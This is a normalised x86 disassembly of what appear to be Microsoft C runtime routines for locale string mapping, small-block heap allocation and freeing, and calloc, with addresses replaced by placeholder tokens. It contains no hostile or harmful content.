mov eax [ eax + 0x14 ]
mov [ ebp + 0x1c ] eax
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
cmp [ ebp + 0x18 ] ebx
mov [ ebp - 0x8 ] ebx
jne r-xdata
push [ ebp + 0x1c ]
call sub_41024d
cmp eax 0xffffffff
pop ecx
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
xor eax eax
jmp r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x10 ]
setne al
push [ ebp + 0xc ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x18 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
cmp eax [ ebp + 0x18 ]
je r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40acd2
leave
retn
jle r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x1c ]
call [ GetStringTypeA@IAT ]
cmp esi ebx
mov edi eax
je r-xdata
push ebx
push ebx
lea ecx [ ebp + 0x10 ]
push ecx
push [ ebp + 0xc ]
push eax
push [ ebp + 0x18 ]
call sub_410294
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
mov eax edi
push esi
call sub_40d805
pop ecx
mov [ ebp + 0xc ] esi
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_40acf0
add esp 0xc
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_40e99d
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
push [ ebp + 0x14 ]
push eax
push ebx
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_40ddc3
cmp eax ebx
pop ecx
je r-xdata
call sub_410210
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_40f04d
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40d3a6
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_40ee95
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40f090
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_40f0d0
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
xor ebx ebx
cmp [ rw-data ] ebx
push edi
mov esi ecx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jle r-xdata
push ebx
push ebx
xor edi edi
inc edi
push edi
push rw-data
push 0x100
push ebx
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
cmp [ ebp + 0x8 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
sub eax ecx
dec eax
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
cmp eax 0x1
jne r-xdata
mov [ ebp + 0x14 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
push [ ebp + 0x8 ]
call sub_41024d
cmp eax 0xffffffff
pop ecx
mov [ ebp - 0x14 ] eax
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
xor eax eax
jmp r-xdata
cmp [ ebp + 0x20 ] ebx
mov [ ebp - 0x8 ] ebx
jne r-xdata
cmp eax [ ebp + 0x20 ]
je r-xdata
lea esp [ ebp - 0x20 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40acd2
leave
retn
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x24 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x20 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov esi eax
push ebx
push ebx
lea ecx [ ebp + 0x14 ]
push ecx
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x20 ]
call sub_410294
add esp 0x18
cmp eax ebx
mov [ ebp - 0xc ] eax
je r-xdata
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
push [ ebp - 0xc ]
call sub_40d805
pop ecx
mov esi [ LCMapStringA@IAT ]
push ebx
push ebx
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
cmp eax ebx
mov [ ebp - 0x8 ] eax
jne r-xdata
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
mov eax esi
cmp [ ebp + 0x18 ] eax
je r-xdata
jle r-xdata
xor esi esi
jmp r-xdata
push edi
push [ ebp - 0xc ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push eax
call sub_40d805
pop ecx
xor edi edi
cmp eax 0xffffffe0
ja r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0xc ]
call sub_40e99d
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov ecx eax
cmp ecx ebx
mov [ ebp - 0x8 ] ecx
je r-xdata
push eax
call sub_40ddc3
cmp eax ebx
pop ecx
je r-xdata
call sub_410210
mov eax esp
cmp eax ebx
je r-xdata
push [ ebp - 0x8 ]
push ebx
push edi
call sub_40acf0
add esp 0xc
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
cmp eax ebx
mov [ ebp - 0x8 ] eax
jne r-xdata
add eax 0x8
cmp eax 0x400
ja r-xdata
test [ ebp + 0xc ] 0x400
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x18 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp - 0x14 ]
call sub_410294
mov esi eax
mov [ ebp - 0x10 ] esi
add esp 0x18
neg esi
sbb esi esi
and esi [ ebp - 0x8 ]
xor esi esi
jmp r-xdata
push eax
call sub_40ddc3
cmp eax ebx
pop ecx
je r-xdata
call sub_410210
mov edi esp
cmp edi ebx
je r-xdata
cmp ecx ebx
jle r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
push edi
call sub_40e99d
pop ecx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
cmp ecx [ ebp + 0x1c ]
jg r-xdata
cmp edi ebx
je r-xdata
push [ ebp - 0x8 ]
push esi
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
jmp r-xdata
push esi
call sub_40e99d
pop ecx
cmp [ ebp + 0x1c ] ebx
push ebx
push ebx
jne r-xdata
push eax
call sub_40ddc3
cmp eax ebx
pop ecx
je r-xdata
call sub_410210
mov esi esp
cmp esi ebx
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push ebx
jmp r-xdata
mov esi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ esi ] 0xcccc
add esi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push esi
push ebx
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp esi ebx
je r-xdata
sub_40f472
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40d3a6
push [ ebp + 0x28 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_40f0d0
add esp 0x20
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40f4b5
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
add ecx eax
jmp r-xdata
cmp eax ecx
jb r-xdata
mov edx [ esp + 0x4 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
xor eax eax
retn
add eax 0x14
sub_40f4e0
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi esi
sub edi [ ecx + 0xc ]
add esi 0xfffffffc
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
test cl 0x1
mov [ ebp - 0x4 ] ecx
jne r-xdata
pop edi
pop esi
leave
retn
push ebx
lea ebx [ ecx + esi ]
mov edx [ ebx ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
test dl 0x1
mov [ ebp + 0xc ] ebx
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov [ ebp - 0x4 ] ecx
cmp edx 0x20
mov ebx 0x80000000
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edx * 8 ]
mov ebx [ ecx + 0x4 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] ebx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
sar edx 0x4
dec edx
cmp edx esi
mov [ ebp - 0x4 ] ecx
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
cmp edx 0x20
mov [ edx + eax + 0x4 ] cl
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
pop ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] edi
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
push 0x4000
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
mov ecx [ rw-data ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ecx edx
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
cmp ebx 0x20
mov esi 0x80000000
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
mov edx [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_40c980
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_40f7f4
mov eax [ rw-data ]
push esi
mov esi [ rw-data ]
push edi
xor edi edi
cmp esi eax
jne r-xdata
imul esi esi 0x14
add esi [ rw-data ]
push 0x41c4
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
cmp eax edi
mov [ esi + 0x10 ] eax
je r-xdata
add eax 0x10
imul eax eax 0x14
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
cmp eax edi
mov [ esi + 0xc ] eax
jne r-xdata
add [ rw-data ] 0x10
mov esi [ rw-data ]
mov [ rw-data ] eax
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
jmp r-xdata
sub_40f8a4
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
push ebx
push esi
mov esi [ ecx + 0x10 ]
push edi
xor ebx ebx
jmp r-xdata
test eax eax
jge r-xdata
add eax eax
inc ebx
mov eax ebx
imul eax eax 0x204
lea eax [ eax + esi + 0x144 ]
push 0x3f
mov [ ebp - 0x8 ] eax
pop edx
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
push 0x4
mov edi ebx
push 0x1000
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
lea edx [ edi + 0x7000 ]
cmp edi edx
mov [ ebp - 0x4 ] edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1f8
lea ecx [ edi + 0xc ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
xor edi edi
inc edi
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
mov ecx edx
sub ecx edi
shr ecx 0xc
lea eax [ edi + 0x10 ]
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea edx [ eax + 0xffc ]
mov [ eax ] edx
lea edx [ eax - 0x1004 ]
mov [ eax - 0x4 ] 0xff0
mov [ eax + 0x4 ] edx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
dec ecx
jne r-xdata
mov edx [ ebp - 0x4 ]
sub_40f9aa
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
imul eax eax 0x14
add eax [ rw-data ]
add ecx 0x17
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
push ebx
dec ecx
cmp ecx 0x20
push esi
push edi
jge r-xdata
add ecx 0xffffffe0
or edx 0xffffffff
xor esi esi
shr edx cl
mov [ ebp - 0x8 ] edx
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov ecx [ rw-data ]
mov ebx ecx
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx eax
jne r-xdata
add ebx 0x14
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
cmp edx 0xffffffff
mov [ ebp - 0x4 ] edx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
mov edx [ eax + 0xc4 ]
lea ecx [ eax + 0x44 ]
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
cmp ebx ecx
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov edx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
add ecx 0x4
jmp r-xdata
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
xor edi edi
and ecx esi
jne r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx ecx
jne r-xdata
test ecx ecx
jge r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
and ecx [ ebp - 0x8 ]
push 0x20
pop edi
jmp r-xdata
mov edi [ ecx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
add ebx 0x14
jmp r-xdata
add ecx ecx
inc edi
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp - 0x8 ] ecx
jle r-xdata
cmp ebx eax
jb r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
add ebx 0x14
mov [ ebp + 0x8 ] ebx
push ebx
call sub_40f8a4
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
test ecx ecx
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
mov ebx 0x80000000
jge r-xdata
xor eax eax
jmp r-xdata
cmp ebx ecx
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ edx + 0x4 ] edi
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx ecx
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xb ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx [ ebp + 0x8 ]
and [ ebx ] ecx
jmp r-xdata
add ebx 0x14
call sub_40f7f4
mov ebx eax
test ebx ebx
mov [ ebp + 0x8 ] ebx
jne r-xdata
and [ rw-data ] 0x0
cmp [ ebp + 0xb ] 0x0
jne r-xdata
cmp [ ebp + 0xb ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_40fc8d
push 0xc
push r--data
call sub_40c6e8
mov ecx [ ebp + 0x8 ]
xor edi edi
cmp ecx edi
jbe r-xdata
imul ecx [ ebp + 0xc ]
mov esi ecx
mov [ ebp + 0x8 ] esi
cmp esi edi
jne r-xdata
push 0xffffffe0
pop eax
xor edx edx
div ecx
cmp eax [ ebp + 0xc ]
sbb eax eax
inc eax
jne r-xdata
xor ebx ebx
mov [ ebp - 0x1c ] ebx
cmp esi 0xffffffe0
ja r-xdata
xor esi esi
inc esi
call sub_40e438
mov [ eax ] 0xc
push edi
push edi
push edi
push edi
push edi
call sub_40e979
add esp 0x14
cmp ebx edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_40c72d
retn
mov eax ebx
cmp [ rw-data ] edi
je r-xdata
cmp ebx edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
ja r-xdata
cmp ebx edi
jne r-xdata
push esi
call sub_40ffcb
pop ecx
test eax eax
jne r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ebx eax
push 0x4
call sub_40cdbd
pop ecx
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_40f9aa
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40fd89
mov ebx [ ebp - 0x1c ]
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
push [ ebp + 0x8 ]
push edi
push ebx
call sub_40acf0
add esp 0xc
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
jmp r-xdata
sub_40fdab
push esi
push 0x4
push 0x20
call sub_40d8d3
mov esi eax
push esi
call sub_40c099
add esp 0xc
test esi esi
mov [ rw-data ] eax
mov [ rw-data ] eax
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
